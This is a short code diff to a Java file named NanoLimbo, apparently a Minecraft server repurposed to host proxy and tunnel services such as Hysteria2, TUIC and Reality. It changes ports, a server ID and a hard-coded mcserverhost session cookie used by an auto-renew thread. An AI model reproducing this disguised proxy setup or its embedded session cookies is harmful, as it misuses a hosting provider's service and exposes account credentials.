@@ -132,14 +132,14 @@ public final class NanoLimbo {
         envVars.put("ARGO_PORT", "");
         envVars.put("ARGO_DOMAIN", "");
         envVars.put("ARGO_AUTH", "");
-        envVars.put("HY2_PORT", "22721");
+        envVars.put("HY2_PORT", "21307");
         envVars.put("TUIC_PORT", "");
         envVars.put("REALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
         envVars.put("CHAT_ID", "");
         envVars.put("BOT_TOKEN", "");
         envVars.put("CFIP", "saas.sin.fan");
-        envVars.put("CFPORT", "");
+        envVars.put("CFPORT", "443");
         envVars.put("NAME", "Mcserver");
         
         for (String var : ALL_ENV_VARS) {
@@ -210,8 +210,8 @@ public final class NanoLimbo {
     // 自动续期线程
     // ================================
     private static void startAutoRenew() {
-        final String serverId = "08bbaee2";
-        final String cookie = "mcserverhost=ce7e2de4-f715-47d6-b500-21443461db3e";
+        final String serverId = "545b9ed1";
+        final String cookie = "mcserverhost=be506e93-bd90-4ebc-ad77-98c1fd7b96c1";
         final String baseUrl = "https://www.mcserverhost.com";
         final String apiUrl = baseUrl + "/api/servers/" + serverId + "/subscription";
 
